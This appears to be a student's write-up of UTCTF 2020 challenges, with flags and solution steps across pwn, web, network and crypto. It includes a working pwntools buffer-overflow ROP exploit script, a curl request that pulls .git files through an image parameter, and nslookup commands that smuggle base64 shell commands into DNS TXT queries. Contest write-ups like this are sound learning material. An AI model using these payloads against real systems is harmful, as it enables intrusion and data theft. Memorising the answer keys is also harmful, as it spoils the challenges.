# UTCTF 2020
###### tags: `Course` `CTF`


## PWN

### BOF

flag: utflag{thanks_for_the_string_!!!!!!}

Simple BOF with ROP Chain(set rdi to 0xdeadbeef)

Reversed:

```lang=c

function getflag(int a){
    if(a == 0xdeadbeef){
        printf(flag.txt)
    }
}

main(){
    char a[108];
    puts("XXXX");
    gets(a);
    puts("XXXX");
    return 0;
}
```

payload:

```lang=c
from pwn import *
  
pop_rdi = p64(0x0000000000400693)
ROP = flat(
    pop_rdi,
    p64(0xdeadbeef)
)

r = remote("binary.utctf.live",9002)
#r = process("./pwnable")
r.recvuntil("!\n")
getflag = p64(0x4005ea)
payload = "a"*120+ROP+getflag
r.sendline(payload)
r.interactive()
```


## Web

### Shrek Fans Only (Not Solved)

Problem Descrition:

```
Shrek seems to be pretty angry about something,
so he deleted some important information off his 
site. He murmured something about Donkey being 
too committed to infiltrate his swamp. Can you 
checkout the site and see what the status is?
```

Entering the Webpage, you can find there is a weird things, the image
```
http://webpageIP/getimg.php?img=aW1nMS5qcGc%3D
```

The value of img parameter is encoded in Base64, which represent img1.jpg

I guessed the challenge is to reconstruct the git history and find the flag

However if you just query website
http://webpageIP/getimg.php?img=btoa(.git/HEAD)
you will get nothing at all, since the returned string is not an image.

After looking for writeup, people use curl to get the output string:

```
curl http://webpageIP/getimg.php?img=btoa(.git/HEAD)
```

With git-dumper, we can construct a full git history. By looking into the git objects, we can find the flag.

If simply using curl to solve this problem, beware that at some point the hash cannot be decoded by zlib correctly, will have to hexlify

```
b'tree 113\x00100644 img1.jpg\x00\x0e\x81\x04\xf5\x1d\xb8\xf9\xee\x08\xf0\x96fV\xa3\xc20~l\xde\\100644 
imgproxy.php\x00l\xfd4\xf3?\x97Lu\x1e\xdc3D\x1b\x11\xd68\xf8K\x15!100644 
index.php\x00ex\xc6/\xa2H\xd0x\xff\xc5Q@\\\x97\x00\xe3\xcc\xc9\xf5\xb3'
```


#### Reference
https://spotless.tech/utctf-ctf-2020-shrek-fans-only.html
https://jaeseokim.tistory.com/100

#### Tools

[git-dumper](https://github.com/arthaud/git-dumper)

### epic admin pwn(Not Solved)

SQL Injection with sqlmap

### spooky store(Not Solved)

XXE attack

## Network

### Do Not Stop

flag: utflag{\$al1y_s3L1S_sE4_dN\$}

Problem Description:

```
One of my servers was compromised, but I can't 
figure it out. See if you can solve it for me!
```

Given a pcap file
After inspecting the file, I found something strange in the dns packet.
The TXT field contains some strings encoded in base64.

After decodeing, I found strings such as:

```
ls -la
whoami
```
So we notice that we can inject command(in base64 format) in the TXT field of dns query.

First we have to find the compromised dns server. The dns server's IP has changed(not the same as the one in pcap). Through query another dns they've set up, we can get the compromised dns server.

```
nslookup 35.225.16.21 dns.google.com -> IP
nslookup --type TXT=base64(cat flag.txt) IP 
```

### Nittaku 3 Star Premium

Given pcap file, we can found weird features in icmp packet

![](https://i.imgur.com/R5Ool3n.png =350x250)

The packet has a sequence, and the response is encoded in base64

After pinging the server(35.188.185.68)
We can get 17 ICMP packets with data in total

decode the data in 17 packets and concat it will return us a zip file, just unzip it.

## Crypto

### Basic[Crypto]

flag: utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}

given a binary text, the content of the file:

```
01010101 01101000 00101101 ...
```

It was filled with 0,1 character, 8 characters form a string, which implies each string can represent a ascii character. With the tool provided below, we can get the ascii string.

The next step is the ascii string is somehow encoded in base64, so simply solved it by chromes console 

```
atob('XXX') 
```

The third step, the hint implies that the string is encrypted with ceasar cipher. Again, with the tool belowed, we can solve the cipher.

The final step, the string(including flag) was encrypted with substitution cipher. After looking the cipher, we found some mappings.

```
hwxdnitvoitjwxk! -> congradulations!
gwv -> you
vtsoid -> utflag
...
```

so we could get a lot of mappings, and finally get the flag.

#### online tool
[binary to ascii](https://www.rapidtables.com/convert/number/binary-to-ascii.html)
[ceaser cipher](https://cryptii.com/pipes/caesar-cipher)
[substitution cipher](http://practicalcryptography.com/ciphers/simple-substitution-cipher/)

### One True Problem (Not Solved)

flag: utflag{tw0_tim3_p4ds}

OTP problem + known plaintext attack
given to string (encrypted with same key, which is the flag)

>213c234c2322282057730b32492e720b35732b2124553d354c22352224237f1826283d7b0651

>3b3b463829225b3632630b542623767f39674431343b353435412223243b7f162028397a103e

**Methods:**
1. Known plaintext attack: key must start with utctf{
2. After apply it to decode we can get the plaintext: THE BES
3. Guess the following plaintext to get the key
4. plaintext: THE BEST CTF CATEGORY IS CRYPTOGRAPHY!

